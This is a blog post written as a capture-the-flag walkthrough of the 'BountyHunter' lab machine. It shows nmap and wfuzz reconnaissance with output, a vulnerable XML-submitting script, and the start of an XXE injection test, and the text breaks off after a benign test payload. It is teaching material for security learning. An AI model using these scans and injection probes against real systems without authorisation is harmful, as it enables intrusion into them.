<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="BountyHunter Write-up" /><meta property="og:locale" content="en" /><meta name="description" content="Enumeration" /><meta property="og:description" content="Enumeration" /><link rel="canonical" href="https://g2jz.github.io/posts/bountyhunter/" /><meta property="og:url" content="https://g2jz.github.io/posts/bountyhunter/" /><meta property="og:site_name" content="root@g2jz:~#" /><meta property="og:image" content="https://g2jz.github.io/cover.png" /><meta property="og:image:height" content="300" /><meta property="og:image:width" content="700" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-09-27T09:00:00+02:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://g2jz.github.io/cover.png" /><meta property="twitter:title" content="BountyHunter Write-up" /><meta name="twitter:site" content="@g2jzz" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-09-27T09:00:00+02:00","datePublished":"2022-09-27T09:00:00+02:00","description":"Enumeration","headline":"BountyHunter Write-up","image":{"width":700,"height":300,"url":"https://g2jz.github.io/cover.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://g2jz.github.io/posts/bountyhunter/"},"url":"https://g2jz.github.io/posts/bountyhunter/"}</script><title>BountyHunter Write-up | root@g2jz:~#</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="root@g2jz:~#"><meta name="application-name" content="root@g2jz:~#"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/commons/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">root@g2jz:~#</a></div><div class="site-subtitle font-italic">g2jz's Personal Blog</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/g2jz" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://www.linkedin.com/in/gaizka-martin/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="https://twitter.com/g2jzz" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['gmartinmendiola','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>BountyHunter Write-up</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>BountyHunter Write-up</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1664262000" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Sep 27, 2022 </em> </span><div class="mt-3 mb-3"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 300'%3E%3C/svg%3E" data-src="/assets/img/posts/bountyhunter/cover.png" class="preview-img bg" alt="Preview Image" width="700" height="300" data-proofer-ignore></div><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/g2jzz">Gaizka Mart√≠n Mendiola</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2829 words"> <em>15 min</em> read</span></div></div></div><div class="post-content"><h2 id="enumeration"><span class="mr-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><hr /><h3 id="nmap"><span class="mr-2">Nmap</span><a href="#nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>First, we will start enumerating the open ports on the victim machine. To do that, we will use <a href="https://github.com/nmap/nmap">nmap</a>. We will specify that we want to scan all the port range, that we only want to display the open ports and that we will use the TCP Syn Port Scan scanning method. Optionally, we will specify explicitly that we don‚Äôt want to perform host discovery and DNS resolution. This will speed up the process. Lastly, we will export all the evidence to a file called <code class="language-plaintext highlighter-rouge">allPorts</code>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmap <span class="nt">-p-</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-oG</span> allPorts 10.10.11.100
</pre></table></code></div></div><div file="enum/allPorts" class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="enum/allPorts"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre># Nmap 7.91 scan initiated Tue Aug  3 18:20:54 2021 as: nmap -p- -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.11.100
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.11.100 ()	Status: Up
Host: 10.10.11.100 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///	Ignored State: closed (65533)
# Nmap done at Tue Aug  3 18:21:08 2021 -- 1 IP address (1 host up) scanned in 13.80 seconds
</pre></table></code></div></div><p>Once we know the open ports on the victim machine, we will perform a more exhaustive scan to try to discover services and versions running on the server. We will save them in a file called <code class="language-plaintext highlighter-rouge">targeted</code>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p22</span>,80 <span class="nt">-oN</span> targeted 10.10.11.100
</pre></table></code></div></div><div file="enum/targeted" class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="enum/targeted"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre># Nmap 7.91 scan initiated Tue Aug  3 12:54:08 2021 as: nmap -sC -sV -p22,80 -oN targeted 10.10.11.100
Nmap scan report for 10.10.11.100
Host is up (0.043s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Aug  3 12:54:17 2021 -- 1 IP address (1 host up) scanned in 8.93 seconds
</pre></table></code></div></div><p>As we see, we only have port 22 (SSH) and port 80 (HTTP) open.</p><h3 id="web-server"><span class="mr-2">Web Server</span><a href="#web-server" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We will start by enumerating the web server.</p><p>If we access the web server using the browser, we will see the following:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/bountyhunter/web1.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>Web Server Index</em></p><p>We can see the page is pretty simple, so we will examine its different resources. In the portal tab we will see the following:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/bountyhunter/web2.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>Web Server Portal Tab</em></p><p>This hyperlink will redirect us to the <code class="language-plaintext highlighter-rouge">log_submit.php</code> page that will look as follows:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/bountyhunter/web3.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>log_submit.php</em></p><h3 id="fuzzing"><span class="mr-2">Fuzzing</span><a href="#fuzzing" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We don‚Äôt have a clear attack vector yet, so we will continue exploring. First of all, we will fuzz the web server in order to find directories in the root of it. To do that, we will use the tool <a href="https://github.com/xmendez/wfuzz">wfuzz</a> along with the <code class="language-plaintext highlighter-rouge">directory-list-2.3-medium.txt</code> wordlist:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>wfuzz <span class="nt">-c</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">-f</span> fuzzRoot,raw <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.11.100/FUZZ
</pre></table></code></div></div><div file="enum/fuzzRoot" class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="enum/fuzzRoot"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre>Target: http://10.10.11.100/FUZZ
Total requests: 220560
==================================================================
ID    Response   Lines      Word         Chars          Request    
==================================================================
00001:  C=200    388 L	    1470 W	  25168 Ch	  "# directory-list-2.3-medium.txt"
00003:  C=200    388 L	    1470 W	  25168 Ch	  "# Copyright 2007 James Fisher"
00007:  C=200    388 L	    1470 W	  25168 Ch	  "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"
00014:  C=200    388 L	    1470 W	  25168 Ch	  "http://10.10.11.100/"
00012:  C=200    388 L	    1470 W	  25168 Ch	  "# on at least 2 different hosts"
00013:  C=200    388 L	    1470 W	  25168 Ch	  "#"
00011:  C=200    388 L	    1470 W	  25168 Ch	  "# Priority ordered case sensitive list, where entries were found"
00010:  C=200    388 L	    1470 W	  25168 Ch	  "#"
00009:  C=200    388 L	    1470 W	  25168 Ch	  "# Suite 300, San Francisco, California, 94105, USA."
00006:  C=200    388 L	    1470 W	  25168 Ch	  "# Attribution-Share Alike 3.0 License. To view a copy of this"
00008:  C=200    388 L	    1470 W	  25168 Ch	  "# or send a letter to Creative Commons, 171 Second Street,"
00005:  C=200    388 L	    1470 W	  25168 Ch	  "# This work is licensed under the Creative Commons"
00002:  C=200    388 L	    1470 W	  25168 Ch	  "#"
00004:  C=200    388 L	    1470 W	  25168 Ch	  "#"
00084:  C=301      9 L	      28 W	    316 Ch	  "resources"
00291:  C=301      9 L	      28 W	    313 Ch	  "assets"
00550:  C=301      9 L	      28 W	    310 Ch	  "css"
00953:  C=301      9 L	      28 W	    309 Ch	  "js"
45240:  C=200    388 L	    1470 W	  25168 Ch	  "http://10.10.11.100/"

Total time: 0
Processed Requests: 46079
Filtered Requests: 46060
Requests/sec.: 0
</pre></table></code></div></div><p>We can see that we have some directories that have resources related to the web server. If we try to access these directories, we will notice that the only accessible one is <code class="language-plaintext highlighter-rouge">resources</code>. This directory will contain the following files:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/bountyhunter/fuzz1.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>Resources directory</em></p><p>There are two files that will attract our attention, <code class="language-plaintext highlighter-rouge">README.txt</code> and <code class="language-plaintext highlighter-rouge">bountylog.js</code>. If we inspect them:</p><div file="content/bountylog.js" class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="content/bountylog.js"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="kd">function</span> <span class="nx">returnSecret</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">return</span> <span class="nb">Promise</span><span class="p">.</span><span class="nx">resolve</span><span class="p">(</span><span class="nx">$</span><span class="p">.</span><span class="nx">ajax</span><span class="p">({</span>
            <span class="na">type</span><span class="p">:</span> <span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span>
            <span class="na">data</span><span class="p">:</span> <span class="p">{</span><span class="dl">"</span><span class="s2">data</span><span class="dl">"</span><span class="p">:</span><span class="nx">data</span><span class="p">},</span>
            <span class="na">url</span><span class="p">:</span> <span class="dl">"</span><span class="s2">tracker_diRbPr00f314.php</span><span class="dl">"</span>
            <span class="p">}));</span>
<span class="p">}</span>

<span class="k">async</span> <span class="kd">function</span> <span class="nx">bountySubmit</span><span class="p">()</span> <span class="p">{</span>
	<span class="k">try</span> <span class="p">{</span>
		<span class="kd">var</span> <span class="nx">xml</span> <span class="o">=</span> <span class="s2">`&lt;?xml  version="1.0" encoding="ISO-8859-1"?&gt;
		&lt;bugreport&gt;
		&lt;title&gt;</span><span class="p">${</span><span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#exploitTitle</span><span class="dl">'</span><span class="p">).</span><span class="nx">val</span><span class="p">()}</span><span class="s2">&lt;/title&gt;
		&lt;cwe&gt;</span><span class="p">${</span><span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#cwe</span><span class="dl">'</span><span class="p">).</span><span class="nx">val</span><span class="p">()}</span><span class="s2">&lt;/cwe&gt;
		&lt;cvss&gt;</span><span class="p">${</span><span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#cvss</span><span class="dl">'</span><span class="p">).</span><span class="nx">val</span><span class="p">()}</span><span class="s2">&lt;/cvss&gt;
		&lt;reward&gt;</span><span class="p">${</span><span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#reward</span><span class="dl">'</span><span class="p">).</span><span class="nx">val</span><span class="p">()}</span><span class="s2">&lt;/reward&gt;
		&lt;/bugreport&gt;`</span>
		<span class="kd">let</span> <span class="nx">data</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">returnSecret</span><span class="p">(</span><span class="nx">btoa</span><span class="p">(</span><span class="nx">xml</span><span class="p">));</span>
  		<span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#return</span><span class="dl">"</span><span class="p">).</span><span class="nx">html</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span>
	<span class="p">}</span>
	<span class="k">catch</span><span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
		<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Error:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">error</span><span class="p">);</span>
	<span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>If we analyze this file, we can observe that it is a simple JavaScript file that is responsible of making an HTTP POST request to a PHP resource. This POST request contains various XML parameters that are encoded in Base64 and sent to the <code class="language-plaintext highlighter-rouge">tracker_diRbPr00f314.php</code> resource. As we can see, user input is not being sanitized, so we can guess that the server is vulnerable to XXE (XML External Entity) Injection.</p><div file="content/README.txt" class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="content/README.txt"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>Tasks:

[ ] Disable 'test' account on portal and switch to hashed password. Disable nopass.
[X] Write tracker submit script
[ ] Connect tracker submit script to the database
[X] Fix developer group permissions
</pre></table></code></div></div><p>In the <code class="language-plaintext highlighter-rouge">README.txt</code> we will have a TODO list. Two tasks have been completed: writing tracker submit script (we assume that this is the <code class="language-plaintext highlighter-rouge">bountylog.js</code>) and fix developer group permissions. But the two other tasks seem not to be completed. These tasks are: connecting the tracker submit script to the database and disabling <code class="language-plaintext highlighter-rouge">test</code> account. We will keep this information in mind.</p><p>We will continue fuzzing the web server for valuable information. We have seen that the web server uses <code class="language-plaintext highlighter-rouge">.php</code> files, so we will fuzz in the web server‚Äôs root based on this extension. We will do that with the following command:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>wfuzz <span class="nt">-c</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">-f</span> fuzzRootPHP,raw <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.11.100/FUZZ.php

</pre></table></code></div></div><div file="content/fuzzRootPHP" class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="content/fuzzRootPHP"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre>Target: http://10.10.11.100/FUZZ.php
Total requests: 220560
==================================================================
ID    Response   Lines      Word         Chars          Request    
==================================================================
00001:  C=200    388 L	    1470 W	  25168 Ch	  "# directory-list-2.3-medium.txt"
00007:  C=200    388 L	    1470 W	  25168 Ch	  "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"
00003:  C=200    388 L	    1470 W	  25168 Ch	  "# Copyright 2007 James Fisher"
00015:  C=200    388 L	    1470 W	  25168 Ch	  "index"
00014:  C=403      9 L	      28 W	    277 Ch	  "http://10.10.11.100/.php"
00013:  C=200    388 L	    1470 W	  25168 Ch	  "#"
00012:  C=200    388 L	    1470 W	  25168 Ch	  "# on atleast 2 different hosts"
00011:  C=200    388 L	    1470 W	  25168 Ch	  "# Priority ordered case sensative list, where entries were found"
00010:  C=200    388 L	    1470 W	  25168 Ch	  "#"
00009:  C=200    388 L	    1470 W	  25168 Ch	  "# Suite 300, San Francisco, California, 94105, USA."
00006:  C=200    388 L	    1470 W	  25168 Ch	  "# Attribution-Share Alike 3.0 License. To view a copy of this"
00008:  C=200    388 L	    1470 W	  25168 Ch	  "# or send a letter to Creative Commons, 171 Second Street,"
00005:  C=200    388 L	    1470 W	  25168 Ch	  "# This work is licensed under the Creative Commons"
00002:  C=200    388 L	    1470 W	  25168 Ch	  "#"
00004:  C=200    388 L	    1470 W	  25168 Ch	  "#"
00368:  C=200      5 L	      15 W	    125 Ch	  "portal"
00848:  C=200      0 L	       0 W	      0 Ch	  "db"
45240:  C=403      9 L	      28 W	    277 Ch	  "http://10.10.11.100/.php"

Total time: 0
Processed Requests: 125506
Filtered Requests: 125488
Requests/sec.: 0
</pre></table></code></div></div><p>We can see two files: <code class="language-plaintext highlighter-rouge">portal.php</code> (we already knew about it) and <code class="language-plaintext highlighter-rouge">db.php</code>. This last file will attract our attention as this type of file often contains credentials. We can‚Äôt read it as it is being interpreted by the web server, so we will keep it in mind for the future.</p><h2 id="user-shell"><span class="mr-2">User Shell</span><a href="#user-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><hr /><h3 id="xxe-external-xml-entity-injection"><span class="mr-2">XXE (External XML Entity) Injection</span><a href="#xxe-external-xml-entity-injection" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>As we have seen in the previous enumeration phase, <code class="language-plaintext highlighter-rouge">log_submit.php</code> sends to <code class="language-plaintext highlighter-rouge">tracker_diRbPr00f314.php</code> via a POST HTTP request, an XML file encoded in Base64 with the parameters found in the web form.</p><p>We will run a simple test in the form:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/bountyhunter/xxe1.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>Simple test in web form</em></p><p>We will intercept this request using the popular <a href="https://portswigger.net/burp/communitydownload">Burpsuite</a> proxy:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/bountyhunter/xxe2.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>Burpsuite Intercept</em></p><p>As we can see, we have a big string that we guess is Base64, so we will copy this data and paste it into the Burpsuite decoder:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/bountyhunter/xxe3.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>Burpsuite Decoder</em></p><p>Since we are dealing with an HTTP request, we suppose it is Base64 encoded and URL encoded. Once we have decoded the string, we can see that it corresponds to an XML file with the same structure that we have seen in <code class="language-plaintext highlighter-rouge">bountylog.js</code>.</p><p>Now that we know we can send an encoded XML file and that the server might be interpreting it, we will test for XXE Injection. To do this, we will use the XML file that we just decoded as a template for our payload. We will create an external entity in this file, named <code class="language-plaintext highlighter-rouge">example</code>, that contains a <code class="language-plaintext highlighter-rouge">'test'</code>string. Then, we will replace one of the XML tags content (in this case, we choose <code class="language-plaintext highlighter-rouge">reward</code>) with a reference to the external entity that we have just created. The resulting payload will look like this:</p><div class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="XML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="cp">&lt;?xml  version="1.0" encoding="ISO-8859-1"?&gt;</span>
<span class="cp">&lt;!DOCTYPE replace [
    &lt;!ENTITY example "test"&gt;</span>]&gt;
		<span class="nt">&lt;bugreport&gt;</span>
		<span class="nt">&lt;title&gt;</span>a<span class="nt">&lt;/title&gt;</span>
		<span class="nt">&lt;cwe&gt;</span>a<span class="nt">&lt;/cwe&gt;</span>
		<span class="nt">&lt;cvss&gt;</span>a<span class="nt">&lt;/cvss&gt;</span>
		<span class="nt">&lt;reward&gt;</span><span class="ni">&amp;example;</span><span class="nt">&lt;/reward&gt;</span>
		<span class="nt">&lt;/bugreport&gt;</span>
